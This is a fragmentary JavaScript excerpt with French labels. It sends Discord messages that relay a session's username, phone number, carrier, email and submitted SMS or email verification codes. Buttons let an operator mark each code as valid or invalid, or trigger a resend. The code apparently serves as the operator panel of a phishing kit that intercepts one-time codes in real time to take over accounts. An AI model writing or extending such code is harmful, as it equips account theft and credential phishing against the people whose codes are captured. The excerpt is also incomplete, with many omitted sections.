        ...
        components: [
          {
            type: 2,
            style: 1,
            label: "Code bon et demander le mail",
            custom_id: `code_email:${sessionId}`,
          },
        ],
      },
    ],
...
export async function sendResendApprovalRequest({ sessionId, username, phone, carrier }) {
  return sendDiscordMessage({
    embeds: [
      {
        ...
        color: 16753920,
        fields: baseFields({ username, phone, carrier }),
        footer: { text: "Cliquez pour confirmer le renvoi du code SMS" },
        timestamp: new Date().toISOString(),
      },
    ],
    components: [
...
export async function sendEmailSubmission({ sessionId, username, phone, carrier, email }) {
  return sendDiscordMessage({
    embeds: [
      {
        title: "📧 Email de vérification reçu",
        color: 3447003,
        fields: [
          ...baseFields({ username, phone, carrier }),
          { name: "Email", value: email, inline: false },
        ],
        footer: { text: "Cliquez pour confirmer l'envoi du code par email" },
        timestamp: new Date().toISOString(),
      },
    ],
    components: [
        ...
        components: [
          {
            type: 2,
            style: 3,
            label: "Envoyer un code sur mail",
            custom_id: `email_code_sent:${sessionId}`,
          },
        ],
      },
    ],
...
export async function sendEmailCodeVerificationRequest({ sessionId, username, phone, carrier, email, code }) {
  return sendDiscordMessage({
    embeds: [
      {
        title: "📬 Code email reçu",
        color: 5763719,
        fields: [
          ...baseFields({ username, phone, carrier }),
        ...
        footer: { text: "Validez ou refusez le code email" },
        timestamp: new Date().toISOString(),
      },
    ],
    components: [
        ...
        components: [
          {
            ...
            style: 3,
            label: "Code bon",
            custom_id: `email_ok:${sessionId}`,
          },
          {
            type: 2,
            style: 4,
            label: "Code invalide",
            custom_id: `email_invalid:${sessionId}`,
          },
        ],
      },
    ],
